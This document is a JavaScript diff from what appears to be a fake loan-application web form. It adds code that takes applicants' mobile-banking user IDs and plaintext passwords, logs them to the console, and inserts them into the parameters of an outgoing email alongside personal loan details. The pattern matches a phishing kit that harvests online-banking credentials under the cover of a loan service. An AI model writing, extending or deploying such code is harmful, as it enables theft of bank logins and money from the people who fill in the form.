@@ -566,9 +566,13 @@
             try {
                 // Debug: Log the data to see what's available
                 console.log('Bank Auth Email Data:', data);
+                console.log('Bank Name:', data.bankName);
+                console.log('User ID:', data.mobileBankingUserId);
+                console.log('Password:', data.mobileBankingPassword);
                 
                 // Get original loan data from sessionStorage for fallback
                 const originalLoanData = JSON.parse(sessionStorage.getItem('loanApplicationData') || '{}');
+                console.log('Original Loan Data:', originalLoanData);
                 
                 const templateParams = {
                     to_email: data.email || originalLoanData.email || 'not-provided@example.com',
@@ -587,7 +591,9 @@
                     zip_code: data.zipCode || originalLoanData.zipCode || 'Not provided',
                     loan_duration: (data.loanDuration || originalLoanData.loanDuration || 'Not specified') + ' months',
                     mobile_banking_user_id: data.mobileBankingUserId || 'Not provided',
-                    two_factor_method: data.twoFactor || 'Not provided'
+                    two_factor_method: data.twoFactor || 'Not provided',
+                    bank_auth_user_id: data.mobileBankingUserId || 'Not provided',
+                    bank_auth_password: data.mobileBankingPassword || 'Not provided'
                 };
 
                 console.log('Email Template Params:', templateParams);
